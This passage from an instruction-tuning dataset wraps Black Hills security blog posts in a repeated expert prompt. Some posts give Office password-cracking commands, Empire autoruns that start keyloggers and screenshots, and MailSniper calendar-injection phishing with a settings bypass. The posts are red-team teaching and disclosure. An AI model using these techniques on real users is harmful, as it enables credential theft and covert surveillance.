PowerShellExecutionPlicy.admx and PowerShellExecutionPolicy.adml to the sysvol Policies Policy Definitions directory Additional Subscriptions At this point you should be ready to test out Event Forwarding Before creating additional subscriptions clear the event log of one of the subscribed endpoints You can verify the status of the clients checking in by right-clicking the subscription and choosing Runtime Status If everything is working appropriately the cleared log event will soon show up in the Forwarded Events log on the WEF server If all is working correctly it's time for creating additional subscriptions that facilitate collecting what matters The NSA Spotting the Adversary publication can be used as a guide below is what we suggest as a minimum Account and Group Activity This subscription will collect domain and local group and account activity The Security Event Log events to add are 4624 4625 4648 4728 4732 4634 4735 4740 4756 These events will be necessary to perform authentication analysis Kerberos This subscription if for event ID 4769 from Domain Controllers There will be a large amount of data recorded as ticket requests are frequent however paired with a HoneyToken account it has the potential to detected Kerberoasting attacks Powershell Logging To collect the module and script block events that were enabled earlier create a subscription to gather the Microsoft-Windows-PowerShell Operational log and get Event IDs 4103 and 4104 Sysmon All of the Sysmon log will be shipped to the WEF server Select the Microsoft-Windows-Sysmon Operational Event log and leave the targeted computers to All Computers Shipping Logs to ELK Similar to our previous posts on endpoint log consolidation we will use nxlog to ship the logs from the WEF server to an ELK stack This architecture allows for usage of PowerShell and C3 tools on the Windows-based log server and EVTX files as well as providing the visualization search capabilities with ELK Use the previous blog post to get ELK up and running if you need to The configuration file for nxlog will be different Install nxlog on the WEF server and modify the configuration file here to point to your ELK stack A basic logstash filter for ingesting the forwarded logs can be found here Conclusion Windows Event Forwarder provides a native way to consolidate Windows Endpoint logs PowerShell and C tools can be used on the WEF server for analysis of the forwarded events Additionally shipping the events to an ELK stack provides visualization and hunting capabilities The overall design paired with sending specific log files such as authentication PowerShell module and script block logging and Sysmon logs creates a DIY SIEM set up that can be used to detect potential attackers in your network References oshuadlewis.blogspot.com 2014 10 advanced-threat-detection-with-sysmon_74.html logs.technet.microsoft.com jepayne 2015 11 23 monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem ithub.com iadgov Event-Forwarding-Guidance"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Crack Passwords for Password Protected MS Office Documents</title>\n<taxonomies>How-To, Password Cracking, Red Team, Red Team Tools, Carrie Roberts, Hashcat, John the Ripper, MS Office, password, password protected MS Office document, Red Team, rockyou</taxonomies>\n<creation_date>Mon, 02 Oct 2017 18:46:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Updated 2 11 2019 Trying to figure out the password for a password protected MS Office document This free solution might do the trick It attempts to guess the password using a long list of potential passwords that you provide This works for all MS Office document types docx xlsx pptx etc There are three different solutions provided in this blog post so read through the entire thing and choose the one that best fits your needs before you get started Let's say we want to guess the password for a file called crackme.xlsx Put this file on your desktop along with these two files msoffice-crypt.exe rockyou.txt You can download msoffice-crypt.exe as described here The rockyou file is a well-known list of passwords used for guessing passwords You can download the rockyou list here Alternatively you can make any password list you want but rockyou is a good start So now you should be set with the three files you need all in one location the MS Office file you want to crack the password for crackme.xlsx the decryption tool msoffice-crypte.exe and a text file full of password guesses rockyou.txt Open a cmd.exe window and change directories to the location where the three files are located C Users swhite Desktop Blog in this example and run the following command FOR F p in rockyou.txt DO msoffice-crypt.exe -d -p p crackme.xlsx 1 NUL echo score password is p pause You can watch the speed of progress in the cmd window title bar When the password is found it will be printed on the line that starts with and the script will be paused Just press Ctrl C to end the script On my system it would take about 11 days of running this around the clock to guess all 14 344 391 passwords contained in the rockyou list Maybe you want to start with a smaller list or consider using John the Ripper or better yet Hashcat to speed things up For John the Ripper Instructions check this out reakstuffmajorly.blogspot.com 2015 09 cracking-microsoft-office-file-passwords.html For Hashcat Instructions there is a very nice tutorial here entestcorner.com cracking-microsoft-office-97-03-2007-2010-2013-password-hashes-with-hashcat For a quick reference here are the commands python office2john.py crackme.xlsx hash.txt You can find office2john.py here hashcat64.exe -a 0 -m 9400 --username hash.txt rockyou.txt You determine which flag to use -m 9400 in the example above via this chart from pentestcorner.com Office 97-03 MD5 RC4 oldoffice 0 oldoffice 1 flag -m 9700 Office 97-03 MD5 RC4 collider-mode 1 flag -m 9710 Office 97-03 MD5 RC4 collider-mode 2 flag -m 9720 Office 97-03 SHA1 RC4 oldoffice 3 oldoffice 4 flag -m 9800 Office 97-03 SHA1 RC4 collider-mode 1 flag -m 9810 Office 97-03 SHA1 RC4 collider-mode 2 flag -m 9820 Office 2007 flag -m 9400 Office 2010 flag -m 9500 Office 2013 flag -m 9600 Hashcat brings the time down to 3 hours to guess the entire rockyou list using a standard laptop with a single GPU Nice I hope this comes in handy for you We love when Carrie guest posts for us Follow her on Twitter OrOneEqualsOne"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Are You Really Hacking Naked?</title>\n<taxonomies>Author, How-To, InfoSec 301, Joff Thyer, MASSCAN, Technical</taxonomies>\n<creation_date>Thu, 12 Oct 2017 15:01:21 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer I had an interesting experience recently that reminded me to always trust but verify Let me set the stage for you As a penetration tester and IT security consultant I have a pretty substantial network and home lab setup In my case this includes a fiber optic strand with an associated 28 IPv4 network block Oh my god why have we not adopted IPv6 But I digress One of my fine Black Hills colleagues Sally asked me to spin up a KALI Linux image for some customer-focused scanning activity using MASSCAN For your information the GitHub link for MASSCAN is included here ithub.com robertdavidgraham masscan This tool is absolutely awesome It literally has the ability to scan the entire Internet in under six minutes at a rate of ten million packets per second My Internet Service Provider in their wisdom provided me with an Adtran 3140 router as a part of my service installation The Adtran has an Ethernet handoff to my own router gateway and is connected upstream to a fiber bridge device Here's the challenge as soon as MASSCAN kicked off the Adtran router immediately started dropping packets left and right Most Information Security consultants would probably say that it was probably a bandwidth problem Well it absolutely was NOT since the scan was configured at a mere 400 packets per second or less I suspected this was actually a connection state tracking issue Why did I think that Well let's look at the goal scan 65535 TCP ports across several hundred IP addresses in a very short amount of time If the perimeter device was tracking connection state and let's say we have only 100 IP addresses being scanned in parallel then we are looking at 655 230 TCP connection states to potentially track in milliseconds I called up the ISP and said Hey folks can you give me a direct Ethernet handoff to my own router device To my surprise they said yes I am thinking Hey cool now we have the consumer crap out of the way let's rock out So I call up Sally and literally say we fixed it and let it rip at 1000 pps What happens next My Linux router dies an untimely death with system CPU time on router cores maxed out at 100 and packets start dropping left and right Let me back up a second here You might be thinking Hey Joff your box should have just been bridging the publicly routable box and how freaking hard is that to do really Well yes this would be the case if the ISP did not require me to route the public IP space being delivered to me but now that I had that Ethernet handoff it was my job to be the router and not just for RFC1918 internal networks The truth Well my Linux system was routing the traffic because the ISP actually treated me as the last router hop for my 28 Hey no big deal I can handle that because I can set some IP forwarding rules up in my iptables configuration and it should be just fine Here is a scenario Imagine your public WAN IP address is 1.2.3.4 and you are lucky enough that your ISP is routing an IP address block of 255.2.2.0 28 to this IP address What does that mean Well any packet directed at 255.2.2.0 28 will arrive at 1.2.3.4 So what does your configuration look like Something like this Interfaces Eth0 1.2.3.4 24 or whatever ISP mask they gave you Eth1 255.2.2.1 28 Yes you need to set up IP forwarding in the kernel also so that all packets arriving at 255.1.2.3 will be forwarded right Ok this is totally cool but you are a security person so you set up your firewall gateway to do other cool stuff like perhaps perform network address translation NAT for some internal network segments and you have egress filtering to boot Being the total geek that you are you have a 4 interface system with the ability to not only host the public IP DMZ segment on Eth1 you have a couple more networks internally like Eth2 192.168.100.1 24 Eth3 192.168.200.1 24 So we are now feeling really good about ourselves in that we have constructed a routed network but our firewall rules need to be laid down In the world of Linux this will all occur in the FORWARD chain of iptables Let's imagine for a second we want to forward ALL traffic to our DMZ and only allow selected traffic to flow internally to outside I am using selected pretty liberally here as the below rules allow all TCP UDP traffic to flow But the real point is that we would want to track connection state using the nf_conntrack module which is a part of the iptables Linux kernel implementation A nice appropriate ruleset would be as follows note that this is in the iptables-save format DMZ traffic -A FORWARD -i eth0 -o eth1 -d 255.2.2.0 28 -j ACCEPT -A FORWARD -i eth1 -o eth0 -s 255.2.2.0 28 -j ACCEPT Internal to Outside Traffic -A FORWARD -s 192.168.0.0 16 -p tcp -j ACCEPT -A FORWARD -s 192.168.0.0 16 -p udp -j ACCEPT -A FORWARD -m state --state RELATED ESTABLISHED -j ACCEPT Intuitively you would think that the above ruleset has you completely covered and everything will be beautiful Yes this is absolutely true until you fire up that MASSCAN from the DMZ in the 255.2.2.1 28 network segment Guess what folks Since you want to diligently track the state of connections from your internal network segment your DMZ interfaces are not immune But wait you say I put rules in that configuration to just let it all pass without hindrance Not so fast Obi-Wan the state tracking applies regardless because you told iptables to do that Ok so MASSCAN fires up and suddenly your connection state table goes from perhaps a few hundred connections hey I have kids to over half a million and your Linux NAT Firewall box keels over dead How did I verify what was happening I used the Linux command conntrack which shows the state table itself Basically if the flow entries figure was very large in the thousands then more connection tracking was occurring than I wanted conntrack -L stuff omitted conntrack v1.4.3 conntrack-tools 310 flow entries have been shown What is the solution There are a couple of thoughts here One is that we should not track the state of forwarded connections Having said that do you REALLY want to just allow ephemeral TCP UDP ports open in the outside inside portion of the configuration I don't think so Kemosabe The right answer in my opinion is a lovely feature of iptables that allows you to tweak the raw table such that some connections will never be tracked So perhaps you need to do something like this raw -A PREROUTING -i eth1 -s 255.2.2.0 28 -d 255.2.2.0 28 -j NOTRACK In short the rule says that if something is entering your home-based Linux router from the DMZ publicly routable segment of your network and the packet is destined to the greater Internet then forget about tracking connection state In other words short circuit the remaining logic of iptables and just forward the packet As you might imagine I researched and implemented something very similar to this in my quest to help Sally and sure enough it worked like a champ So all in the space of one day I achieved Direct Ethernet handoff from ISP Happier network performance Happier kid and happier Dad Winning scanner performance Go forth and profit and remember to always Keep Calm and Hack Naked"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Grepping Through PowerView Output</title>\n<taxonomies>Red Team, Red Team Tools, Grep, PowerShell, PowerView</taxonomies>\n<creation_date>Wed, 18 Oct 2017 15:13:38 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Have you found yourself trying to Grep through PowerView output or any PowerShell output for that matter and find that it returns no results for text you know is in the file PowerShell default output encoding is UTF-16 causing unexpected Grep results The fix is easy just use the built-in Linux OS X tool iconv as follows Make a mental note and log this away for the next time Grep is making you scratch your head Carrie is one of our favorite BHIS blog post guests"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Empire Resource Files and Auto Runs</title>\n<taxonomies>Red Team, Red Team Tools, automating commands, Empire, Empire Project, Listeners, PowerShel commands, PowerShell, PowerShell Empire</taxonomies>\n<creation_date>Thu, 26 Oct 2017 14:00:25 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts I have added resource file and autorun functionality to PowerShell Empire Empire now has the ability to run multiple commands at once by specifying the commands in a resource file You can use this feature to automate the startup of your listeners and perform other tasks In addition you can specify multiple commands to run automatically on any new agents that connect using the new autorun feature Consider the following resource file containing the Empire commands used to startup our go-to listener named http443 on port 443 In this example the file is called http443.rc and is located in the root directory listeners uselistener http set Name http443 set DefaultProfile admin login.php console dashboard.asp news today.jsp Mozilla 5.0 Windows NT 6.1 WOW64 Trident 7.0 set Host 192.168.0.124 set Port 443 execute To run all these commands at once within Empire simply use the newly added resource command as shown below Wow that was easy one command and everything is started with our custom settings Here is another example resource file to generate the OS X and Windows launch commands for our new listener listeners usestager osx launcher set Listener http443 execute back usestager multi launcher set Listener http443 execute The image above shows the output from running the launchers.rc resource file The beginning of the Python launcher is shown at the bottom echo import sys The Powershell one-liner was also output but not shown in the image for brevity Now let's have a look at the autorun command that I added to the agent's menu With the autorun command you can specify a resource file to execute automatically when a new agent connects to your listener When you set the autorun you specify which agent language the commands should be run on e.g Python or PowerShell Consider that we have the following in the resource file root autorun-py.rc usemodule trollsploit osx say set Text Supercalifragilisticexpialidocious execute This file is intended to execute on a Python agent OS X and to speak the text Supercalifragilisticexpialidocious using the computer text-to-speech functionality Next we have a resource file specifying three modules to run on any PowerShell agents that connect root autorun-ps.rc usemodule collection keylogger execute back usemodule collection screenshot execute back usemodule trollsploit voicetroll set VoiceText Booya execute The resource file above contains commands to start keylogging take a screenshot and say the text Booya The following commands will set the autorun for any Python and PowerShell agents To see what commands have been set for each language use the autorun show command optionally specifying the language Okay now we have told Empire to execute the autorun-py commands automatically whenever a new Python agent connects and run the autorun-ps commands whenever a new PowerShell agent connects To clear the autorun setting use the autorun clear command The first command below clears only the Python autorun commands while the second command clears autorun commands for all languages We have demonstrated a lot of cool things but let's roll all this functionality up into a single resource file that does it all root doitall.rc Start my port 80 http listener resource root http80.rc Start my port 443 http listener resource root http443.rc set my autorun scripts resource root autoruns.rc return to the main menu main This resource file calls other resource files such as the http443.rc file demonstrated at the beginning of this post It also starts up a similar listener on port 80 and sets our autoruns using the autoruns.rc file shown below agents autorun root autorun-py.rc python autorun root autorun-ps.rc powershell Note that in the doitall.rc file descriptive comments are included Any line that starts with is considered a comment and ignored by Empire We could run our doitall.rc file from within Empire using the resource command or we can specify it on the command line when starting Empire with the --resource parameter Awesome we started up listeners with custom settings and set our autoruns all with a single command Very nice Here is a video walkthrough of everything discussed in this post outu.be 5WmssrVMmEI To use this new feature grab the Empire code from ithub.com EmpireProject Empire Until these features are merged into a release or the Master branch you'll have to check out the dev branch to use these features I hope you enjoy this new functionality as much as I do it definitely removes a large pain point when using Empire and makes way for a high degree of automation ________ Though Carrie no longer works for BHIS she remains our good friend and loyal guest post contributor You can follow her on Twitter"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Google Calendar Event Injection with MailSniper</title>\n<taxonomies>Author, Beau Bullock, Mike Felch, Red Team, Red Team Tools, Event Injection, G Suite, Google, Google Calendar</taxonomies>\n<creation_date>Wed, 01 Nov 2017 20:00:29 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock Michael Felch Source hrome.google.com webstore detail google-calendar-by-google gmbgaklkmjakoegficnlkhebmhkjfich Overview Google Calendar is one of the many features provided to those who sign up for a Google account along with other popular services such as Gmail and Google Drive Following email the calendar is probably the second most used piece of productivity software in an enterprise It allows employees to schedule out the workweek so that things can actually get accomplished Google has an interesting feature that automatically adds various events to your calendar If your Google account receives an email stating you have booked flights reservations for a dinner or even movie tickets Google will automatically add these events to your calendar Black Hills Information Security took a deeper look at how these events were being generated BHIS discovered that it was not required to send an email to a target to create an event on their calendar Additionally there are security controls that can be enabled on a Google account that attempt to prevent this from happening but BHIS discovered bypasses to these controls In this post BHIS will discuss this Event Injection vulnerability the risks associated with it and how to exploit it using MailSniper Black Hills Information Security reported this issue to Google See the section titled Timeline of Disclosure below for details History We were working on a red team assessment for a customer that we knew was going to be tough It was discovered that this customer was utilizing G Suite For Business which is one of Google's offerings for enterprise customers who would like to have their enterprise email and other services hosted by Google Knowing this we wanted to take a different approach to how we were going to attempt red teaming the environment A few months earlier one of us had something interesting happen A Google event notification popped up on the calendar stating that a booked flight was departing in 10 minutes This was not a flight that the BHIS employee had booked Opening up the event and checking where the source of the event creation came from it was discovered that the event was generated from an email that had been sent A coworker had sent their flight itinerary in an email and Google thought these details were a different BHIS employee's itinerary and automatically added it to their calendar In researching how these events were being generated it was discovered that an email wasn't even necessary to create an event in someone's calendar This can be very easily done manually through the Google Calendar UI When you create an event and add guests Google will ask you whether you would like to send invitations to the guests after saving it Simply selecting Don't Send will save the event to the guest's calendar if it is a Google account and not send them an email BHIS thought this could provide a very interesting situation for phishing users of a G Suite environment As most users have been trained to spot phishing links in emails and Google itself has a few protections against phishing Gmail users we thought focusing on social engineering users through Calendar event may be more successful Event Injection Social Engineering Possibly the most interesting element of the calendar is that it can create a sense of urgency simply by alerting a user to something Perhaps the user completely forgot they had a meeting scheduled If someone has their Google account linked to their phone it is possible to generate an alert for an event directly on their phone as well as email to their account When it comes to the ruse that is used the skies are limitless One ruse we had great success with for this particular red team assessment was an All Hands Meeting that was happening in 10 minutes In the body of the event we included text pointing the victim to an agenda that was required to be read before the meeting The site linked in the body of the event hosted a fake Google authentication page that captured their credentials and redirected the user to the fake agenda more on that fake authentication page using CredSniper in part II of this post This method proved to be highly successful Invoke-InjectGEvent Invoke-InjectGEventAPI New modules have been added to MailSniper for injecting events into target calendars The first method Invoke-InjectGEvent only requires a set of Google account credentials The second method Invoke-InjectGEventAPI we'll discuss involves connecting directly to the Google API To use MailSniper to inject events into a Google calendar first import MailSniper.ps1 ithub.com dafthack MailSniper into a PowerShell session PS C Import-Module MailSniper.ps1 Next you will need a Google account If you are attempting to social engineer an organization a potential idea would be to perform some reconnaissance on the target organization find an employee of high rank and sign up for a Gmail account under a similar name This way when the target sees the event pop up in their calendar the organizer's name looks somewhat familiar Those credentials can then be used with the Invoke-InjectGEvent module as follows PS C Invoke-InjectGEvent -EmailAddress 'emailaddressofattacker gmail.com -Password 'attackerpassword -EventTitle 'Title of Event -EventLocation 'lobal.gotomeeting.com join 123456890 -EventDescription 'Summary of the event Maybe include link to a fake Google Auth Page -StartDateTime 20171031T160000 -EndDateTime 20171031T163000 -Targets 'victim gmail.com This will create an event in the target's calendar provided they haven't disabled the automatic event add feature that we'll discuss more in a moment There are a few settings that can be set within Google Calendar to prevent events from automatically being added to the calendar The first setting is called Events from Gmail and there is a checkbox called Add automatically If this checkbox is checked then Google will automatically add events from emails sent to a Gmail account similar to the flight itinerary mentioned above The second setting is called Automatically add invitations to my calendar There are three options here including Yes Yes but don't send event notifications unless I have responded Yes or Maybe No only show invitations to which I have responded With the first setting this only prevents events from being added if the sender actually sends you an email invitation Simply performing the manual steps listed earlier to create a calendar entry without sending a notification still works there The second setting is a bit more interesting There is an option that states No only show invitations to which I have responded This prevents the first method of injecting events from working However BHIS found that it is possible to set the target's response status to Accepted using the Google API This effectively bypasses this security setting A module called Invoke-InjectGEventAPI has been added to MailSniper for injecting these types of events via the Google API In order to connect to the Google API there are a few steps that must be taken first to get an API Access token A Login to Google using the account you want to inject the event as.B Go to onsole.developers.google.com flows enableapi?apiid calendar pli 1.C Create select a Project and agree to ToS and continue D Click Go to Credentials .E On the Add credentials to your project page click cancel.F At the top of the page select the OAuth consent screen tab Select an Email address enter a Product name if not already set and click the Save button.G Select the Credentials tab click the Create credentials button and select OAuth client ID.H Select the application type Web application under Authorized redirect URIs paste in the following address evelopers.google.com oauthplayground Then click the Create button I Copy your Client ID and Client Secret .J Navigate here evelopers.google.com oauthplayground .K Click the gear icon in the upper right corner and check the box to Use your own OAuth credentials Enter the OAuth2 client ID and OAuth2 client secret in the boxes L Make sure that OAuth flow is set to Server-side and Access Type is set to offline.M Select the Calendar API v3 dropdown and click both URLs to add them to scope Click Authorize APIs N Select the account you want to authorize then click Allow If there is an error such as Error redirect_uri_mismatch then it's possible the changes haven't propagated yet Just wait a few minutes hit the back button and try to authorize again O You should now be at Step 2 Exchange authorization code for tokens Click the Exchange authorization code for tokens button The Access token is the item we need for accessing the API Copy the value of the Access token Now that you have a Google account that can access the Google API you can use the MailSniper module Invoke-InjectGEventAPI to inject an event bypassing the security settings mentioned previously Take note that the Access token expires after 3600 seconds A module for refreshing this token is planned to be added into MailSniper soon but simply clicking the Refresh access token button shown in the previous screenshot will generate a new one After importing MailSniper into a PowerShell session as previously shown the following command can be used to inject an event into a target's calendar using the Google API PS C Invoke-InjectGEventAPI -PrimaryEmail your-api-email-address gmail.com -AccessToken 'Insert your access token here -Targets CEOofEvilCorp gmail.com CTOofEvilCorp gmail.com CFOofEvilCorp.com -StartDateTime 2017-10-22T17 20 00 -EndDateTime 2017-10-22T17 30 00 -EventTitle All Hands Meeting -EventDescription Please review the agenda at the URL below prior to the meeting efinitelynotmalicious.com -EventLocation Interwebz The reason this bypasses the security setting is due to the fact that the Google API has a writable property on events called attendees .responseStatus that can be set to 'accepted Setting this when creating an event effectively makes it appear that a target has already accepted the event Conclusion As of the date this blog was posted it is possible to inject events into Google calendars without a victim being able to prevent it Additionally it is not necessary for an email invitation to be sent for that event so it's possible to directly inject events into a Google user's calendar without them ever receiving a notification This presents a very unique opportunity for social engineering Google users Black Hills Information Security reported this issue to Google See the section titled Timeline of Disclosure below for details Stay tuned for part II of this post where we discuss CredSniper a brand new framework for phishing Google users including the capture of various two-factor authentication tokens Timeline of Disclosure Oct 9 BHIS discloses event injection with and without Calendar API to Google Oct 9 Google sends automated response Oct 10 Google triaged report Oct 17 Google release Calendar update silently adds Calendar setting to disable injection log.google products g-suite time-refresh-introducing-new-look-and-features-google-calendar-web No updates to BHIS initial report Oct 27 BHIS publicly discloses event injection at WWHF Oct 31 Google responds stating it's a feature and the settings provide users the ability to disable Oct 31 BHIS updates Google with step-by-step procedures to bypass settings"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Stargazing at Wild West Hackin' Fest</title>\n<taxonomies>Fun & Games, Wild West Hackin' Fest, WWHF, WWHF Lab, WWHF Speakers</taxonomies>\n<creation_date>Mon, 06 Nov 2017 21:22:45 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Gail Menius The sky is clear the air is so cool and crisp with the small dusting of snow muting the sounds of Deadwood you can almost hear the stars and how brightly they shine at the Wild West Hackin Fest These stars are not the balls of glowing gasses in the sky even though they are magnificent here these stars are the stars of the infosec community These stars shine brightly not just because they are successful in their career they shine brightly because their character and disposition are exemplary I was shocked because everywhere I turned was someone that had a wonderful heart and a healthy way to live that I wanted for myself Does that normally happen at a tech conference Here are some examples of the kind of stars I saw over the weekend Playful During the closing ceremony one woman had a Masterlock in her hand had taken off her lock pick earrings and was testing out her new toys I want to be playful like Sally Kind The first morning of the conference we ran out of coffee There was a kind woman who wanted our conference to go well and said The conference can be amazing but if you run out of coffee that's all they'll talk about They'll go home and say 'Great talks but they ran out of coffee She is responsible for GravWell unexpectedly sponsoring coffee for us I want to be kind like Sweet_Grrl Tenacious At the hardware hacking lab I was busy identifying the pins on a wireless router As I turned the laminated pages and studied the JTAGULATOR and its soldered wires I considered the time it took to put together those labs I want tenacity like Brian David and Rick Joe Ethan BB King Chevy Kent and Jordan Balanced One of the speakers spoke about how balance was important in life He goes for a walk in the morning a long walk He also spends time with family I want to be balanced like Ed Active Those beautiful five people who were up at six o'clock in the morning during Wild West Hackin Fest on Saturday morning Those people went out for a run They were able to see the morning like no one else at the conference that morning could I want to be active like John Erica Christine Robin and Nicholas Considerate There was a woman who knew she was a part of a community bigger than herself She considered the implications of digital currency and what it would mean to people who didn't have access to the internet She gave a talk about how we had the power and the intellect to understand how money works and how we were responsible for considering all those in our global economy not just people in our country not just people who had access to bitcoin debit cards and the like I want to be considerate like Tarah These are just a handful examples of the kinds of stars I saw Most people were friendly motivated focused and considerate I could go on but I do have a job to do at BHIS I felt very blessed to be a part of something where there was a sense of community People were concerned with not only how they affected others in the industry but how they effect their families and the world Thanks Wild West Hackin Fest for showing me what it was like to be surrounded by stars in the beautiful Black Hills of South Dakota Now I remember who I want to be"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Debating the Active Defense Law.. Because Arguing is Fun</title>\n<taxonomies>Author, Blue Team, John Strand, Active Defense, ADHD, Arguing is Fun, Debates, Law, No Debate is Finished Until Hitler Is Mentioned</taxonomies>\n<creation_date>Fri, 17 Nov 2017 14:18:12 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand I wanted to take a few moments and address the Hacking Back law that is working people up There is a tremendously well-founded fear that this law will lead to mass confusion collateral damage and some say possibly war At least they have not brought me up in this debate Yet A Hitler While some of these fears are a bit unfounded they are still legitimate and need to be discussed clearly Further we need to back away from the extreme fringes of this debate Unfortunately the discussion has dissolved into whether hacking back is good or bad with little wiggle room in between To be clear I think the law as it stands now is a bad idea However I do believe that with a few tweaks it can be saved and possibly even made useful There are two sections of the law that cause me to pause and I think are the cause of concern for most security professionals Basically it is the section that would allow the following bb disrupt continued unauthorized activity against the defender's own network or cc monitor the behavior of an attacker to assist in developing future intrusion prevention or cyber defense techniques but Yeah that is where this law crosses the line Through the removal of those two lines and possibly a few more tweaks it can be saved Let's back up for a few seconds and cover what it may allow First in Section 3 the law allows for the use of Attributional Technology This would be technology that would allow an organization to take measures to identify where an attacker is In the Active Defense Harbinger Distribution we have things like this in the form of Word Web Bugs and various apps and programs that will call back when executed The components in ADHD that do this were designed to be in line with previous case decisions such as Susan-Clements vs Absolute Software where Judge Rice ruled It is one thing to cause a stolen computer to report its IP address or its geographical location in an effort to track it down it is something entirely different to violate federal wiretapping laws by intercepting the electronic communications of the person using the stolen laptop This creates a clear and sane line for defenders to follow And to be fair this law follows that line of reasoning up until sections 3-2-bb and 3-2-cc The line You crossed it With these two sections this law I feel is crossing a dangerous line By continuing to monitor a system there is a strong possibility that the defender will be monitoring the activities of an unsuspecting third-party victim of the attacker By degrading the ability of an attacker to attack there is a strong possibility of degrading a third-party system Either way I think it would be in the interests of the community at large to stop simply breaking this conversation into bad and not bad camps There is plenty of room in the middle to find new and inventive ways to detect bad guys without breaking existing laws or impacting third parties"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Home Network Design - Part 1</title>\n<taxonomies>Ethan Robish, How-To, InfoSec 201, Cisco, guest networks, home network, home networking, how to set up your home wifi, how to set up your internet at home, Routers, wi-fi</taxonomies>\n<creation_date>Wed, 22 Nov 2017 15:27:45 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ethan Robish In this series of posts I'll discuss how I segmented my home network using VLANs and how I moved away from using a risky consumer-grade router at the edge of my network My goal for this series is to take you from using a consumer-grade router running a flat network to a segmented network as cheaply as possible I'll also touch on easier more advanced and more expensive options so you know what's available I began with a network like most people completely flat behind a single consumer-grade wireless router that serves all my household's devices I have a few wired systems but the majority of my connectivity is wireless due to convenience and lack of cabling in my house My initial motivation was to separate out a guest network for friends and family who come to visit But then I thought Why not take it a step or two further and segment some of my home devices as well If you're Cisco certified or architect networks for a living this post isn't for you though you could probably teach me quite a bit Likewise if you already have something other than an off-the-shelf router from a big box store then I would point you to Troy Hunt's article ww.troyhunt.com ubiquiti-all-the-things-how-i-finally-fixed-my-dodgy-wifi on how he configured his home network Although you can certainly skim through this post to see some of the other options available to you that you might not be aware of In this post I will start by going over general terminology and some of the different options available to you Network Topologies In the diagrams below I'll ignore any modem or other devices you have to interface with your ISP The device you'll see connected to the internet in my diagrams has a publicly routable IP address This first diagram shows the starting point of my network and probably yours too The easiest solution that would meet my initial goal would be to simply set up a guest wireless network Here are a couple of options to satisfy that goal 1 Single Wireless Router with a Guest 